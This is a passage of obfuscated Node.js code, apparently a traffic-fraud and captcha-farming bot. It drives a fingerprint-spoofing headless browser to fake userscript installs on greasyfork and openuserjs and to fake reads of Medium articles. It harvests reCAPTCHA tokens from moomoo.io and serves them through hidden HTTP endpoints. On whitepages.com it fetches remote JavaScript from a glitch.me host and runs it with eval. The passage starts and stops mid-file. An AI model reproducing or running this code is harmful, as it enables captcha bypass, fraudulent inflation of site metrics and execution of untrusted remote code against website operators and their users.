      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + U(0x1c) + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + T(0x8, 'nRBn') + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + T(0x3, '4^k@') + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + U(0x1) + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + V(0x0) + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + V(0x9) + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x6 * 0x42d + -0x390 + -0x157e
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const W = b;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1345 + -0xd2b * -0x1 + 0x61a)['vanillaLau' + 'nchOptions'](pptOptions)[W(0xa, '74BH')]([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1e39 + -0x20 * -0xc9 + -0x36f5), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1837 + -0x2212 + -0xa3f * -0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x934 + 0xbb7 + -0x283;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0xb94 + 0x20d2 + -0x2c66; w < getRandomInt(0xb1d + -0x8e * -0x2 + -0xc38, 0x24cc * 0x1 + -0x4ea + 0x1fdd * -0x1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x12000 + 0x472 * 0x31 + -0x10f72);
        }
      }();
    }, 0x6 * 0x288 + -0xa6 * -0x1b + 0x1 * -0x204e), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        const X = c;
        axios[X(0x2)]('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x83 + -0xa8b + -0x282 * -0x4;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x3 * 0x36f + -0x6bb * -0x3 + -0x9e4, 0x1355 * 0x1 + -0x4d2 * -0x5 + -0x2b3d * 0x1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x6 * -0x12e7 + -0x44 * -0x14b + -0x8eae * -0x1);
    }, 0x2439 + 0x168f + -0x3a64), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x1fb7 + -0x1 * -0x41f + 0x11eb * -0x2;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0xda + 0x8f1 + 0x1ed), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x2536 + 0xec3 * 0x1 + 0x1153 * -0x3), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x7 * -0x27c0d + 0x12a175 * -0x1 + -0x1095d * -0x30);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x3 * 0x757 + -0xc0 * 0x2d + 0x3829);
  })()), doFlags[V(0x12) + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x5 * 0x323 + 0x84a * -0x1 + -0x1 * 0x69d);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x992 * 0x5 + 0x2f35 + -0x3f7f);
}
doFlags['doOUJS'] && ((async () => {
  const Z = b,
    Y = d;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x85 * -0x39 + 0x9d * -0x11 + 0x280b) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x2 * -0x127c + -0x245e + 0x4957));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x5 * 0x4b + 0x72f * 0x1 + -0x5b8, D['indexOf']('\x20'));
        return B ? E['slice'](0x1 * 0xbcb + -0x11a7 * -0x2 + -0xfb3 * 0x3, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x18b5 * 0x1 + -0x46c1 + 0x8686),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x6f * -0x43 + -0xa * 0x88 + -0x1 * -0xf53),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + Y(0x18) + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      Z(0x11, 'v3sS') + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + Z(0x16, 'GJ7r') + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1 * 0x6bb + 0x231f + 0x9e * -0x2e; k < 0x932 + -0x1811 + -0x67 * -0x25; k++)
    setTimeout(f, (-0x1 * -0x122f3 + 0x3 * -0x4569 + -0x5c * -0x1a6) * k * getRandomInt(-0x1a8b + 0xa68 * -0x1 + 0x24f4, 0x2079 + 0x12b4 * 0x1 + -0x332a));
  setInterval(() => {
    f();
    for (let l = 0x3 * 0xcae + -0x1df6 + -0x814; l < -0x5a * -0x5b + 0x2416 + -0x4410; l++)
      setTimeout(f, (0xad * 0x1 + 0x489 * -0x19 + 0x15b14) * l * getRandomInt(0x233f + -0x2591 + 0x23 * 0x11, 0x21b6 + 0x20b4 + -0x4267));
  }, 0x83d9 * -0xae + 0x1 * -0x3087fb + 0x1eb * 0x64ab);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const a0 = c,
    f = axios['create']({
      'headers': {
        'User-Agent': userAgents[a0(0xe)]()
      }
    });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
